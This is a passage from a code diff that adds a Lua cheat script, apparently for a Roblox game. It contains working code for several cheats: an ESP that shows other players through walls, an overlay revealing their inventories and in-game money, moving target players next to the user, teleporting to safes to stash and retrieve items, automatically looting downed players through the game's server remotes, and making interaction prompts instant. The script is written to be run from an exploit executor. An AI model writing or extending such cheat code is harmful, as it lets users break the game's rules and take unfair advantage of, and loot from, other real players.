+                                    pRoot.CFrame = myRoot.CFrame + (myRoot.CFrame.LookVector * 5) + Vector3.new(0, 0, 0)
+                                end
+                            end
+                        end
+                    end
+                    task.wait(0.05)
+                end
+            end)
+        else
+            bringT = {}
+        end
+    end,
+})
+
+TargetTab:CreateDivider()
+
+local ESPTab = Window:CreateTab("ESP", 4483362458)
+local ESPSection = ESPTab:CreateSection("ESP Scripts")
+ESPSection:Set("ESP Scripts")
+ESPTab:CreateDivider()
+
+local ESP_ENABLED = false
+local ESP_HIGHLIGHTS = {}
+local PlayerConnections = {}
+
+local function removeESP(player)
+    if ESP_HIGHLIGHTS[player] then
+        pcall(function() ESP_HIGHLIGHTS[player]:Destroy() end)
+        ESP_HIGHLIGHTS[player] = nil
+    end
+end
+
+local function applyESP(player, char)
+    if player == LocalPlayer or not char then return end
+    removeESP(player)
+
+    local h = Instance.new("Highlight")
+    h.Name = "ESP_Highlight"
+    h.FillTransparency = 1
+    h.OutlineTransparency = 0
+    h.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+    h.Parent = char
+
+    ESP_HIGHLIGHTS[player] = h
+end
+
+local function setupPlayer(player)
+    if player == LocalPlayer then return end
+
+    if PlayerConnections[player] then
+        for _, conn in ipairs(PlayerConnections[player]) do
+            conn:Disconnect()
+        end
+    end
+    PlayerConnections[player] = {}
+
+    local charConn = player.CharacterAdded:Connect(function(char)
+        if ESP_ENABLED then
+            char:WaitForChild("HumanoidRootPart", 5)
+            task.wait(0.2)
+            if ESP_ENABLED then
+                applyESP(player, char)
+            end
+        end
+    end)
+    table.insert(PlayerConnections[player], charConn)
+
+    if player.Character and ESP_ENABLED then
+        applyESP(player, player.Character)
+    end
+end
+
+local function enableESP()
+    ESP_ENABLED = true
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p ~= LocalPlayer then
+            setupPlayer(p)
+            if p.Character then
+                applyESP(p, p.Character)
+            end
+        end
+    end
+end
+
+local function disableESP()
+    ESP_ENABLED = false
+    for _, p in ipairs(Players:GetPlayers()) do
+        removeESP(p)
+    end
+end
+
+Players.PlayerAdded:Connect(function(player)
+    setupPlayer(player)
+end)
+
+Players.PlayerRemoving:Connect(function(player)
+    removeESP(player)
+    if PlayerConnections[player] then
+        for _, conn in ipairs(PlayerConnections[player]) do
+            conn:Disconnect()
+        end
+        PlayerConnections[player] = nil
+    end
+end)
+
+for _, p in ipairs(Players:GetPlayers()) do
+    setupPlayer(p)
+end
+
+ESPTab:CreateToggle({
+    Name = "Players ESP",
+    CurrentValue = false,
+    Flag = "TogglePlayersESPActive",
+    Callback = function(Value)
+        if Value then 
+            enableESP() 
+        else 
+            disableESP() 
+        end
+    end,
+})
+
+RunService.RenderStepped:Connect(function()
+    if ESP_ENABLED then
+        local t = tick() * 2
+        local color = Color3.new(
+            math.sin(t) * 0.5 + 0.5,
+            math.sin(t + 2) * 0.5 + 0.5,
+            math.sin(t + 4) * 0.5 + 0.5
+        )
+        for p, h in pairs(ESP_HIGHLIGHTS) do
+            if h and h.Parent then
+                h.OutlineColor = color
+            else
+                if p and p.Character and ESP_ENABLED then
+                    applyESP(p, p.Character)
+                end
+            end
+        end
+    end
+end)
+
+ESPTab:CreateDivider()
+
+local BILLBOARDS = {}
+local SHOWING_INVENTORY = false
+local InvConnections = {}
+
+local BLACKLIST = {
+    ["apple"]=true,["water"]=true,["banana"]=true,["donut"]=true,["coffee"]=true,["fist"]=true,
+    ["gun stock"]=true,["gun action"]=true,["gun barrel"]=true,["tape"]=true,["blueprint"]=true,
+    ["fabric"]=true,["steel"]=true,["steel plate"]=true,["refined powder"]=true,["gunpowder"]=true,
+    ["rolling paper"]=true,["med powder"]=true,["empty capsule"]=true,["shell casing"]=true,["medicine powder"]=true,
+    ["chips"]=true,["cheets"]=true,["lemon soda"]=true,["orange soda"]=true,
+}
+
+local RED_ITEMS = {
+    ["m4a1"]=true, ["glock17"]=true, ["magnum"]=true, ["fnp-45"]=true, ["aks-74u"]=true
+}
+
+local BLUE_ITEMS = {
+    ["vest"]=true, ["stick-o"]=true, ["bandage"]=true, ["renepill"]=true
+}
+
+local GREEN_ITEMS = {
+    ["pipe"]=true, ["rake"]=true, ["sledgehammer"]=true, ["butcher knife"]=true, ["wrench"]=true, ["frying pan"]=true
+}
+
+local BLACK_ITEMS = {
+    ["koth box 1"]=true, ["koth box 2"]=true, ["koth box 3"]=true
+}
+
+local function isBlacklisted(name)
+    return BLACKLIST[string.lower(name)] == true
+end
+
+local function getFormattedInventory(player)
+    if player == LocalPlayer then return "None" end
+    local items = {}
+
+    local function collectTools(container)
+        if not container then return end
+        for _, tool in ipairs(container:GetChildren()) do
+            if tool:IsA("Tool") and not isBlacklisted(tool.Name) then
+                local lowerName = string.lower(tool.Name)
+                local displayName = tool.Name
+                
+                if RED_ITEMS[lowerName] then
+                    table.insert(items, '<font color="rgb(255, 50, 50)">' .. displayName .. '</font>')
+                elseif BLUE_ITEMS[lowerName] then
+                    table.insert(items, '<font color="rgb(50, 150, 255)">' .. displayName .. '</font>')
+                elseif GREEN_ITEMS[lowerName] then
+                    table.insert(items, '<font color="rgb(50, 255, 50)">' .. displayName .. '</font>')
+                elseif BLACK_ITEMS[lowerName] then
+                    table.insert(items, '<font color="rgb(35, 35, 35)">' .. displayName .. '</font>')
+                else
+                    table.insert(items, '<font color="rgb(255, 255, 255)">' .. displayName .. '</font>')
+                end
+            end
+        end
+    end
+
+    if player:FindFirstChild("Backpack") then
+        collectTools(player.Backpack)
+    end
+
+    if player.Character then
+        collectTools(player.Character)
+    end
+
+    return (#items == 0) and "None" or table.concat(items, ", ")
+end
+
+local function getFormattedLeaderstats(player)
+    if player == LocalPlayer then return "" end
+    local leaderstats = player:FindFirstChild("leaderstats")
+    if not leaderstats then return "Bank: ₱0 | DWallet: ₱0 | Wallet: ₱0" end
+
+    local bank = leaderstats:FindFirstChild("BankData") and leaderstats.BankData.Value or 0
+    local dwallet = leaderstats:FindFirstChild("DirtyWallet") and leaderstats.DirtyWallet.Value or 0
+    local wallet = leaderstats:FindFirstChild("WalletData") and leaderstats.WalletData.Value or 0
+
+    return string.format("Bank: ₱%s | DWallet: ₱%s | Wallet: ₱%s", tostring(bank), tostring(dwallet), tostring(wallet))
+end
+
+local function updateBillboard(player)
+    local billboard = BILLBOARDS[player]
+    if billboard and billboard.Parent then
+        local textLabel = billboard:FindFirstChildOfClass("TextLabel")
+        if textLabel then
+            local display = player.DisplayName or player.Name
+            local username = "@" .. player.Name
+            textLabel.Text =
+                "<font size='10'>" .. display .. "</font>\n" ..
+                "<font size='12'><b>" .. username .. "</b></font>\n" ..
+                "<font size='9' color='rgb(255, 255, 255)'>" .. getFormattedLeaderstats(player) .. "</font>\n" ..
+                "<font size='10'>" .. getFormattedInventory(player) .. "</font>"
+        end
+    end
+end
+
+local function removeBillboard(player)
+    if BILLBOARDS[player] then
+        if BILLBOARDS[player].Parent then
+            BILLBOARDS[player]:Destroy()
+        end
+        BILLBOARDS[player] = nil
+    end
+end
+
+local function createBillboard(player)
+    if player == LocalPlayer or not SHOWING_INVENTORY then return end
+    removeBillboard(player)
+
+    local char = player.Character
+    if not char then return end
+
+    local head = char:WaitForChild("Head", 3)
+    if not head then return end
+
+    local billboard = Instance.new("BillboardGui")
+    billboard.Name = "InventoryESP_Gui"
+    billboard.AlwaysOnTop = true
+    billboard.Size = UDim2.new(0, 240, 0, 110)
+    billboard.StudsOffset = Vector3.new(0, 2.5, 0)
+    billboard.Parent = head
+
+    local text = Instance.new("TextLabel")
+    text.Size = UDim2.new(1, 0, 1, 0)
+    text.BackgroundTransparency = 1
+    text.TextColor3 = Color3.new(1, 1, 1)
+    text.TextStrokeTransparency = 0.2
+    text.Font = Enum.Font.SourceSansBold
+    text.TextScaled = false
+    text.TextWrapped = true
+    text.RichText = true
+    text.Parent = billboard
+
+    BILLBOARDS[player] = billboard
+    updateBillboard(player)
+end
+
+local function hookInventory(player)
+    if player == LocalPlayer then return end
+
+    local function monitorContainer(container)
+        if not container then return end
+        local c1 = container.ChildAdded:Connect(function(child)
+            if child:IsA("Tool") then
+                task.wait(0.05)
+                updateBillboard(player)
+            end
+        end)
+        local c2 = container.ChildRemoved:Connect(function(child)
+            if child:IsA("Tool") then
+                task.wait(0.05)
+                updateBillboard(player)
+            end
+        end)
+        
+        InvConnections[player] = InvConnections[player] or {}
+        table.insert(InvConnections[player], c1)
+        table.insert(InvConnections[player], c2)
+    end
+
+    local function monitorLeaderstats(ls)
+        if not ls then return end
+        for _, stat in ipairs(ls:GetChildren()) do
+            if stat:IsA("ValueBase") then
+                local conn = stat.Changed:Connect(function()
+                    updateBillboard(player)
+                end)
+                table.insert(InvConnections[player], conn)
+            end
+        end
+        local addedConn = ls.ChildAdded:Connect(function(stat)
+            if stat:IsA("ValueBase") then
+                local conn = stat.Changed:Connect(function()
+                    updateBillboard(player)
+                end)
+                table.insert(InvConnections[player], conn)
+                updateBillboard(player)
+            end
+        end)
+        table.insert(InvConnections[player], addedConn)
+    end
+
+    InvConnections[player] = InvConnections[player] or {}
+
+    if player:FindFirstChild("Backpack") then
+        monitorContainer(player.Backpack)
+    end
+
+    local ls = player:FindFirstChild("leaderstats")
+    if ls then
+        monitorLeaderstats(ls)
+    else
+        local lsConn
+        lsConn = player.ChildAdded:Connect(function(child)
+            if child.Name == "leaderstats" then
+                monitorLeaderstats(child)
+                lsConn:Disconnect()
+            end
+        end)
+        table.insert(InvConnections[player], lsConn)
+    end
+
+    local charConn = player.CharacterAdded:Connect(function(char)
+        task.wait(0.5)
+        monitorContainer(char)
+        if player:FindFirstChild("Backpack") then
+            monitorContainer(player.Backpack)
+        end
+        if SHOWING_INVENTORY then
+            createBillboard(player)
+        end
+    end)
+
+    table.insert(InvConnections[player], charConn)
+
+    if player.Character then
+        monitorContainer(player.Character)
+    end
+end
+
+for _, p in ipairs(Players:GetPlayers()) do
+    hookInventory(p)
+end
+
+Players.PlayerAdded:Connect(function(p)
+    hookInventory(p)
+    p.CharacterAdded:Connect(function()
+        task.wait(0.5)
+        if SHOWING_INVENTORY then
+            createBillboard(p)
+        end
+    end)
+end)
+
+Players.PlayerRemoving:Connect(function(player)
+    removeBillboard(player)
+    if InvConnections[player] then
+        for _, conn in ipairs(InvConnections[player]) do
+            conn:Disconnect()
+        end
+        InvConnections[player] = nil
+    end
+end)
+
+local function enableInventoryESP()
+    SHOWING_INVENTORY = true
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p ~= LocalPlayer then
+            createBillboard(p)
+        end
+    end
+end
+
+local function disableInventoryESP()
+    SHOWING_INVENTORY = false
+    for _, p in ipairs(Players:GetPlayers()) do
+        removeBillboard(p)
+    end
+end
+
+ESPTab:CreateToggle({
+    Name = "Inventory ESP",
+    CurrentValue = false,
+    Flag = "ToggleInventoryESPActive",
+    Callback = function(Value)
+        if Value then enableInventoryESP() else disableInventoryESP() end
+    end,
+})
+
+ESPTab:CreateDivider()
+
+local itemLootFolder = workspace:WaitForChild("LootSystem"):WaitForChild("ItemLoot")
+
+local espEnabled = false
+local espConnection = nil
+
+local function setupSearchESP(item)
+    if not item:FindFirstChild("SearchESP_Highlight") then
+        local highlight = Instance.new("Highlight")
+        highlight.Name = "SearchESP_Highlight"
+        highlight.Adornee = item
+        highlight.FillColor = Color3.fromRGB(0, 255, 128)
+        highlight.FillTransparency = 0.5
+        highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
+        highlight.Parent = item
+    end
+end
+
+local function removeSearchESP(item)
+    local hl = item:FindFirstChild("SearchESP_Highlight")
+    if hl then hl:Destroy() end
+end
+
+ESPTab:CreateToggle({
+    Name = "Search ESP",
+    CurrentValue = false,
+    Flag = "SearchESPToggle",
+    Callback = function(Value)
+        espEnabled = Value
+      
+        if espEnabled then
+            for _, item in ipairs(itemLootFolder:GetChildren()) do
+                setupSearchESP(item)
+            end
+          
+            espConnection = itemLootFolder.ChildAdded:Connect(function(item)
+                if espEnabled then
+                    task.wait(0.1)
+                    setupSearchESP(item)
+                end
+            end)
+        else
+            if espConnection then
+                espConnection:Disconnect()
+                espConnection = nil
+            end
+          
+            for _, item in ipairs(itemLootFolder:GetChildren()) do
+                removeSearchESP(item)
+            end
+        end
+    end,
+})
+
+ESPTab:CreateDivider()
+
+local StashTab = Window:CreateTab("Stash", 4483362458)
+local StashSection = StashTab:CreateSection("Stash & Retrieve Items")
+StashSection:Set("Stash & Retrieve Items")
+StashTab:CreateDivider()
+
+local lastActionTime = 0
+local COOLDOWN_DURATION = 2.0
+
+local function checkCooldown()
+    local currentTime = tick()
+    if currentTime - lastActionTime < COOLDOWN_DURATION then
+        return false
+    end
+    lastActionTime = currentTime
+    return true
+end
+
+local MASTER_STASH_ENABLED = false
+
+local BLACKLISTED_STASH_ITEMS = {
+    ["banana"] = true,
+    ["apple"] = true,
+    ["water"] = true,
+    ["donut"] = true,
+    ["coffee"] = true,
+    ["fist"] = true,
+    ["gun stock"] = true,
+    ["gun action"] = true,
+    ["gun barrel"] = true,
+    ["tape"] = true,
+    ["blueprint"] = true,
+    ["fabric"] = true,
+    ["steel"] = true,
+    ["steel plate"] = true,
+    ["refined powder"] = true,
+    ["gunpowder"] = true,
+    ["rolling paper"] = true,
+    ["med powder"] = true,
+    ["empty capsule"] = true,
+    ["shell casing"] = true,
+    ["medicine powder"] = true,
+    ["chips"]=true,
+    ["cheets"]=true,
+    ["lemon soda"]=true,
+    ["orange soda"]=true,
+}
+
+local function isBlacklistedStash(name)
+    return BLACKLISTED_STASH_ITEMS[string.lower(name)] == true
+end
+
+local function stashItems()
+    if not MASTER_STASH_ENABLED then return end
+    if not checkCooldown() then return end
+
+    task.spawn(function()
+        local safeboxFolder = workspace:FindFirstChild("SafesOnMap")
+        if not safeboxFolder then
+            warn("SafesOnMap folder not found in workspace!")
+            return
+        end
+
+        local character = LocalPlayer.Character
+        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+        local hrp = character and character:FindFirstChild("HumanoidRootPart")
+        if not hrp then return end
+
+        if humanoid then
+            pcall(function()
+                humanoid:UnequipTools()
+            end)
+            task.wait(0.05)
+        end
+
+        local closestSafeBox = nil
+        local shortestDist = math.huge
+
+        for _, safeBox in ipairs(safeboxFolder:GetChildren()) do
+            local mainPart = safeBox:FindFirstChild("MainDoor") or safeBox:FindFirstChild("Part") or safeBox:FindFirstChildWhichIsA("BasePart")
+            if mainPart then
+                local dist = (hrp.Position - mainPart.Position).Magnitude
+                if dist < shortestDist then
+                    shortestDist = dist
+                    closestSafeBox = safeBox
+                end
+            end
+        end
+
+        if not closestSafeBox then
+            warn("No SafeBox found!")
+            return
+        end
+
+        local targetPart = closestSafeBox:FindFirstChild("MainDoor") 
+            or closestSafeBox:FindFirstChild("Part") 
+            or closestSafeBox:FindFirstChildWhichIsA("BasePart")
+
+        local clickDetector = closestSafeBox:FindFirstChild("ClientClick") or closestSafeBox:FindFirstChild("ClickDetector", true)
+
+        if not targetPart then
+            warn("SafeBox part not found!")
+            return
+        end
+
+        if clickDetector then
+            pcall(function() fireclickdetector(clickDetector) end)
+        else
+            pcall(function()
+                firetouchinterest(hrp, targetPart, 0)
+                task.wait(0.05)
+                firetouchinterest(hrp, targetPart, 1)
+            end)
+        end
+
+        task.wait(0.3)
+
+        local safeBoxRemote = ReplicatedStorage:FindFirstChild("SafeBox") and ReplicatedStorage.SafeBox:FindFirstChild("Inventory")
+        local backpack = LocalPlayer:FindFirstChild("Backpack")
+
+        if safeBoxRemote and backpack then
+            for _, tool in ipairs(backpack:GetChildren()) do
+                if not MASTER_STASH_ENABLED then break end
+                if tool:IsA("Tool") and not isBlacklistedStash(tool.Name) then
+                    pcall(function()
+                        safeBoxRemote:FireServer("Change", tool.Name, "Backpack", "SafeBox")
+                    end)
+                    pcall(function()
+                        safeBoxRemote:FireServer("Deposit", tool)
+                    end)
+                    task.wait(0.12)
+                end
+            end
+        else
+            warn("SafeBox RemoteEvent or Backpack not found!")
+        end
+    end)
+end
+
+StashTab:CreateToggle({
+    Name = "Toggle Stash Items",
+    CurrentValue = false,
+    Flag = "ToggleStashItemsMaster",
+    Callback = function(Value)
+        MASTER_STASH_ENABLED = Value
+    end,
+})
+
+StashTab:CreateButton({
+    Name = "Stash Filtered Items",
+    Callback = function()
+        stashItems()
+    end,
+})
+
+StashTab:CreateDivider()
+
+local AutoStashDeadEnabled = false
+local isStashingOnDeath = false
+
+local function triggerStashOnDeath()
+
+    if not AutoStashDeadEnabled or isStashingOnDeath then return end
+    isStashingOnDeath = true
+    
+    lastActionTime = 0 
+
+    if typeof(stashItems) == "function" then
+        stashItems()
+    end
+
+    task.delay(5, function()
+        isStashingOnDeath = false
+    end)
+end
+
+RunService.Heartbeat:Connect(function()
+    if not AutoStashDeadEnabled then return end
+
+    local character = LocalPlayer.Character
+    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+    local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
+    local deadGui = playerGui and playerGui:FindFirstChild("Dead")
+
+    if (humanoid and humanoid.Health <= 0) or (deadGui and deadGui.Enabled) then
+        triggerStashOnDeath()
+    end
+end)
+
+StashTab:CreateToggle({
+    Name = "Auto Stash All When Dead",
+    CurrentValue = false,
+    Flag = "AutoStashWhenDeadToggle",
+    Callback = function(Value)
+        AutoStashDeadEnabled = Value
+        if not Value then
+            isStashingOnDeath = false
+        end
+    end,
+})
+
+StashTab:CreateDivider()
+
+local backpackDropdown = nil
+local currentBackpackItems = {}
+
+local function stashBackpackItem(toolName)
+    if not checkCooldown() then return end
+
+    if isBlacklistedStash(toolName) then
+        return
+    end
+
+    task.spawn(function()
+        local safeboxFolder = workspace:FindFirstChild("SafesOnMap")
+        if not safeboxFolder then return end
+
+        local character = LocalPlayer.Character
+        local hrp = character and character:FindFirstChild("HumanoidRootPart")
+        if not hrp then return end
+
+        local closestSafeBox = nil
+        local shortestDist = math.huge
+
+        for _, safeBox in ipairs(safeboxFolder:GetChildren()) do
+            local mainPart = safeBox:FindFirstChild("MainDoor") or safeBox:FindFirstChild("Part") or safeBox:FindFirstChildWhichIsA("BasePart")
+            if mainPart then
+                local dist = (hrp.Position - mainPart.Position).Magnitude
+                if dist < shortestDist then
+                    shortestDist = dist
+                    closestSafeBox = safeBox
+                end
+            end
+        end
+
+        if not closestSafeBox then return end
+
+        local targetPart = closestSafeBox:FindFirstChild("MainDoor") 
+            or closestSafeBox:FindFirstChild("Part") 
+            or closestSafeBox:FindFirstChildWhichIsA("BasePart")
+
+        local clickDetector = closestSafeBox:FindFirstChild("ClientClick") or closestSafeBox:FindFirstChild("ClickDetector", true)
+
+        if not targetPart then return end
+
+        if clickDetector then
+            pcall(function() fireclickdetector(clickDetector) end)
+        else
+            pcall(function()
+                firetouchinterest(hrp, targetPart, 0)
+                task.wait(0.05)
+                firetouchinterest(hrp, targetPart, 1)
+            end)
+        end
+
+        task.wait(0.3)
+
+        local safeBoxRemote = ReplicatedStorage:FindFirstChild("SafeBox") and ReplicatedStorage.SafeBox:FindFirstChild("Inventory")
+        if safeBoxRemote then
+            pcall(function()
+                safeBoxRemote:FireServer("Change", toolName, "Backpack")
+            end)
+        end
+    end)
+end
+
+local function getBackpackItemList()
+    local options = {}
+    currentBackpackItems = {}
+    local toolCounts = {}
+
+    local function collectFromContainer(container)
+        if not container then return end
+        for _, tool in ipairs(container:GetChildren()) do
+            if tool:IsA("Tool") and not isBlacklistedStash(tool.Name) then
+                toolCounts[tool.Name] = (toolCounts[tool.Name] or 0) + 1
+            end
+        end
+    end
+
+    collectFromContainer(LocalPlayer:FindFirstChild("Backpack"))
+    collectFromContainer(LocalPlayer.Character)
+
+    for toolName, count in pairs(toolCounts) do
+        local formattedName = toolName .. " (" .. tostring(count) .. "x)"
+        table.insert(options, formattedName)
+        currentBackpackItems[formattedName] = toolName
+    end
+
+    if #options == 0 then
+        table.insert(options, "Inventory Empty")
+    end
+
+    return options
+end
+
+backpackDropdown = StashTab:CreateDropdown({
+    Name = "Select Backpack Item to Stash",
+    Options = getBackpackItemList(),
+    CurrentOption = {"Select Item"},
+    MultipleOptions = false,
+    Callback = function(option)
+        local selectedDisplay = option[1]
+        local actualToolName = currentBackpackItems[selectedDisplay]
+        if actualToolName then
+            stashBackpackItem(actualToolName)
+        end
+    end,
+})
+
+local isRefreshing = false
+local function refreshBackpackDropdown()
+    if backpackDropdown and not isRefreshing then
+        isRefreshing = true
+        pcall(function()
+            backpackDropdown:Refresh(getBackpackItemList(), true)
+        end)
+        task.wait(0.3)
+        isRefreshing = false
+    end
+end
+
+local function hookBackpack(backpack)
+    if not backpack then return end
+    backpack.ChildAdded:Connect(function(child)
+        if child:IsA("Tool") then
+            refreshBackpackDropdown()
+        end
+    end)
+    backpack.ChildRemoved:Connect(function(child)
+        if child:IsA("Tool") then
+            refreshBackpackDropdown()
+        end
+    end)
+end
+
+hookBackpack(LocalPlayer:FindFirstChild("Backpack"))
+
+LocalPlayer.CharacterAdded:Connect(function(char)
+    task.wait(0.5)
+    hookBackpack(LocalPlayer:FindFirstChild("Backpack"))
+    refreshBackpackDropdown()
+    
+    char.ChildAdded:Connect(function(child)
+        if child:IsA("Tool") then
+            refreshBackpackDropdown()
+        end
+    end)
+    char.ChildRemoved:Connect(function(child)
+        if child:IsA("Tool") then
+            refreshBackpackDropdown()
+        end
+    end)
+end)
+
+if LocalPlayer.Character then
+    LocalPlayer.Character.ChildAdded:Connect(function(child)
+        if child:IsA("Tool") then
+            refreshBackpackDropdown()
+        end
+    end)
+    LocalPlayer.Character.ChildRemoved:Connect(function(child)
+        if child:IsA("Tool") then
+            refreshBackpackDropdown()
+        end
+    end)
+end
+
+StashTab:CreateDivider()
+
+local InvData = LocalPlayer:FindFirstChild("InvData")
+local stashDropdown = nil
+local currentInvDataItems = {}
+
+local function retrieveItemFromStash(itemName)
+    if not checkCooldown() then return end
+
+    task.spawn(function()
+        local safeboxFolder = workspace:FindFirstChild("SafesOnMap")
+        if not safeboxFolder then
+            warn("SafesOnMap folder not found in workspace!")
+            return
+        end
+
+        local character = LocalPlayer.Character
+        local hrp = character and character:FindFirstChild("HumanoidRootPart")
+        if not hrp then return end
+
+        local closestSafeBox = nil
+        local shortestDist = math.huge
+
+        for _, safeBox in ipairs(safeboxFolder:GetChildren()) do
+            local mainPart = safeBox:FindFirstChild("MainDoor") or safeBox:FindFirstChild("Part") or safeBox:FindFirstChildWhichIsA("BasePart")
+            if mainPart then
+                local dist = (hrp.Position - mainPart.Position).Magnitude
+                if dist < shortestDist then
+                    shortestDist = dist
+                    closestSafeBox = safeBox
+                end
+            end
+        end
+
+        if not closestSafeBox then
+            warn("No SafeBox found!")
+            return
+        end
+
+        local targetPart = closestSafeBox:FindFirstChild("MainDoor") 
+            or closestSafeBox:FindFirstChild("Part") 
+            or closestSafeBox:FindFirstChildWhichIsA("BasePart")
+
+        local clickDetector = closestSafeBox:FindFirstChild("ClientClick") or closestSafeBox:FindFirstChild("ClickDetector", true)
+
+        if not targetPart then
+            warn("SafeBox part not found!")
+            return
+        end
+
+        if typeof(enableCFly) == "function" then
+            enableCFly()
+        end
+        
+        local oldCFrame = hrp.CFrame
+        hrp.CFrame = targetPart.CFrame + Vector3.new(0, 3, 0)
+        task.wait(0.3)
+
+        if clickDetector then
+            pcall(function() fireclickdetector(clickDetector) end)
+        else
+            pcall(function()
+                firetouchinterest(hrp, targetPart, 0)
+                task.wait(0.05)
+                firetouchinterest(hrp, targetPart, 1)
+            end)
+        end
+
+        task.wait(0.4)
+
+        local safeBoxRemote = ReplicatedStorage:FindFirstChild("SafeBox") and ReplicatedStorage.SafeBox:FindFirstChild("Inventory")
+        if safeBoxRemote then
+            pcall(function()
+                safeBoxRemote:FireServer("Change", itemName, "Inv")
+            end)
+            task.wait(0.2)
+        else
+            warn("SafeBox Inventory RemoteEvent not found!")
+        end
+
+        hrp.CFrame = oldCFrame
+        task.wait(0.1)
+        if typeof(disableCFly) == "function" then
+            disableCFly()
+        end
+    end)
+end
+
+local function getInvDataItemList()
+    if not InvData then
+        InvData = LocalPlayer:FindFirstChild("InvData")
+    end
+    
+    local options = {}
+    currentInvDataItems = {}
+
+    if InvData then
+        for _, child in ipairs(InvData:GetChildren()) do
+            if child:IsA("ValueBase") then
+                local itemName = child.Name
+                local itemValue = child.Value or 0
+
+                if itemValue > 0 then
+                    local formattedName = itemName .. " (" .. tostring(itemValue) .. "x)"
+                    table.insert(options, formattedName)
+                    currentInvDataItems[formattedName] = itemName
+                end
+            end
+        end
+    end
+
+    if #options == 0 then
+        table.insert(options, "No Stashed Items Found")
+    end
+
+    return options
+end
+
+stashDropdown = StashTab:CreateDropdown({
+    Name = "Select Stashed Item to Retrieve",
+    Options = getInvDataItemList(),
+    CurrentOption = {"Select Item"},
+    MultipleOptions = false,
+    Callback = function(option)
+        local selectedDisplay = option[1]
+        local actualItemName = currentInvDataItems[selectedDisplay]
+        if actualItemName then
+            retrieveItemFromStash(actualItemName)
+        end
+    end,
+})
+
+local function refreshInvDataDropdown()
+    if stashDropdown then
+        stashDropdown:Refresh(getInvDataItemList(), true)
+    end
+end
+
+if InvData then
+    for _, child in ipairs(InvData:GetChildren()) do
+        if child:IsA("ValueBase") then
+            child.Changed:Connect(function()
+                refreshInvDataDropdown()
+            end)
+        end
+    end
+    
+    InvData.ChildAdded:Connect(function(child)
+        if child:IsA("ValueBase") then
+            child.Changed:Connect(function()
+                refreshInvDataDropdown()
+            end)
+        end
+        refreshInvDataDropdown()
+    end)
+
+    InvData.ChildRemoved:Connect(function()
+        refreshInvDataDropdown()
+    end)
+end
+
+local AutoTab = Window:CreateTab("Auto", 4483362458)
+local AutoSection = AutoTab:CreateSection("Auto Scripts")
+AutoSection:Set("Auto Scripts")
+AutoTab:CreateDivider()
+
+local LootEvents = ReplicatedStorage:WaitForChild("Events")
+local LootData = LootEvents:WaitForChild("LootData")
+local LootRequest = LootEvents:WaitForChild("LootRequest")
+local LootTakeTool = LootEvents:WaitForChild("LootTakeTool")
+
+local MASTER_AUTO_LOOT_ENABLED = false
+local isCurrentlyLooting = {}
+
+local BLACKLISTED_ITEMS = {
+    ["banana"] = true,
+    ["apple"] = true,
+    ["water"] = true,
+    ["donut"] = true,
+    ["coffee"] = true,
+    ["fist"] = true,
+    ["gun stock"] = true,
+    ["gun action"] = true,
+    ["gun barrel"] = true,
+    ["tape"] = true,
+    ["blueprint"] = true,
+    ["fabric"] = true,
+    ["steel"] = true,
+    ["steel plate"] = true,
+    ["refined powder"] = true,
+    ["gunpowder"] = true,
+    ["rolling paper"] = true,
+    ["med powder"] = true,
+    ["empty capsule"] = true,
+    ["shell casing"] = true,
+    ["medicine powder"] = true,
+    ["chips"] = true,
+    ["cheets"] = true,
+    ["lemon soda"] = true,
+    ["orange soda"] = true,
+}
+
+LootData.OnClientEvent:Connect(function(targetPlayerName, toolList)
+    if not MASTER_AUTO_LOOT_ENABLED then return end
+    if not targetPlayerName or not toolList then return end
+
+    task.spawn(function()
+        for _, itemName in ipairs(toolList) do
+            if not MASTER_AUTO_LOOT_ENABLED then break end
+            if not BLACKLISTED_ITEMS[itemName] then
+                task.spawn(function()
+                    LootTakeTool:FireServer(targetPlayerName, itemName)
+                end)
+            end
+        end
+        task.wait(0.5)
+        isCurrentlyLooting[targetPlayerName] = nil
+    end)
+end)
+
+task.spawn(function()
+    while true do
+        task.wait(0.1)
+        if MASTER_AUTO_LOOT_ENABLED then
+            local myRoot = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+            if myRoot then
+                for _, player in ipairs(Players:GetPlayers()) do
+                    if player ~= LocalPlayer and player.Character and not isCurrentlyLooting[player.Name] then
+                        local targetRoot = player.Character:FindFirstChild("HumanoidRootPart")
+                        local targetHumanoid = player.Character:FindFirstChild("Humanoid")
+                        
+                        if targetRoot and targetHumanoid and (targetHumanoid.Health <= 0 or player:GetAttribute("LootablePose") == true or player:GetAttribute("Downed") == true or targetHumanoid.PlatformStand == true) then
+                            if (myRoot.Position - targetRoot.Position).Magnitude <= 3 then
+                                isCurrentlyLooting[player.Name] = true
+                                pcall(function()
+                                    LootRequest:FireServer(player.Name)
+                                end)
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+end)
+
+AutoTab:CreateToggle({
+    Name = "Toggle Auto loot",
+    CurrentValue = false,
+    Flag = "ToggleAutoLootMaster",
+    Callback = function(Value)
+        MASTER_AUTO_LOOT_ENABLED = Value
+    end,
+})
+
+AutoTab:CreateDivider()
+
+local promptModEnabled = false
+local promptConnection = nil
+
+local EXCLUDED_PROMPTS = {
+    ["BMShopPrompt"] = true,
+    ["GDShopPrompt"] = true,
+    ["Shop1Prompt"] = true,
+    ["Shop2Prompt"] = true,
+}
+
+local function shouldExclude(prompt)
+    if EXCLUDED_PROMPTS[prompt.Name] then return true end
+    local parent = prompt.Parent
+    while parent and parent ~= workspace do
+        if parent.Name == "NPCs" or parent.Name == "Blackmarket" or parent.Name == "GunD" or parent.Name == "Shop1" or parent.Name == "Shop2" then
+            return true
+        end
+        parent = parent.Parent
+    end
+    return false
+end
+
+AutoTab:CreateToggle({
+    Name = "Instant Prompts",
+    CurrentValue = false,
+    Flag = "InstantPromptsToggle",
+    Callback = function(Value)
+        promptModEnabled = Value
+      
+        if promptModEnabled then
+            for _, descendant in ipairs(workspace:GetDescendants()) do
+                if descendant:IsA("ProximityPrompt") and not shouldExclude(descendant) then
+                    descendant.HoldDuration = 0
+                    descendant.MaxActivationDistance = 10
+                end
+            end
+          
+            promptConnection = workspace.DescendantAdded:Connect(function(descendant)
+                if promptModEnabled and descendant:IsA("ProximityPrompt") and not shouldExclude(descendant) then
+                    descendant.HoldDuration = 0
